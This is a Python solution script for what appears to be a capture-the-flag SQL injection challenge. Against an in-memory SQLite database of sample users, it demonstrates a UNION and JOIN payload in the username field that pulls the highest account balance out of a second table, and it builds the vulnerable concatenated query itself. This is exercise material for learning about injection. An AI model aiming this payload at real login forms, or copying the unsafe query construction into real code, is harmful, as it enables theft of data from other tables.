#!/usr/bin/env python3
"""
Challenge 14 - UNION + JOIN injection to pull data out of another table.

verify() wants the user with the highest balance, with the balance landing in the role
column spot. The vulnerable query selects three columns (name, username, role). SQL
matches UNION columns by position, so I UNION a query that selects
(name, username, balance), JOIN the balance table, ORDER BY balance DESC and LIMIT 1.
That way the balance (10000) ends up where the program reads role.

Payload (username field):
    ' UNION SELECT name,username,balance FROM users
      JOIN account_balance ON users.id=account_balance.user_id
      ORDER BY balance DESC LIMIT 1--
"""
import hashlib
import sqlite3

PAYLOAD = ("' UNION SELECT name,username,balance FROM users "
           "JOIN account_balance ON users.id=account_balance.user_id "
           "ORDER BY balance DESC LIMIT 1--")


def build_db() -> sqlite3.Connection:
    con = sqlite3.connect(":memory:")
    con.executescript(
        """
        CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, name TEXT, role TEXT);
        CREATE TABLE account_balance (user_id INTEGER, balance INTEGER);
        INSERT INTO users VALUES
            (1,'alice@app.com','x','alice','user'),
            (2,'bob@app.com','x','bob','user'),
            (3,'charlie@app.com','x','charlie','user');
        INSERT INTO account_balance VALUES (1,3000),(2,2000),(3,10000);
        """
    )
    return con


def main() -> None:
    con = build_db()
    md5 = hashlib.md5(b"test").hexdigest()
    query = (f"SELECT name,username,role FROM users "
             f"WHERE username='{PAYLOAD}' AND password=('{md5}')")
    name, username, role_slot = con.execute(query).fetchall()[0]
    print("Pulled out:", {"name": name, "username": username, "balance_in_role_slot": role_slot})
    print("Program checks name=='charlie', username=='charlie@app.com', role=='10000':",
          name == "charlie" and username == "charlie@app.com" and str(role_slot) == "10000")


if __name__ == "__main__":
    main()
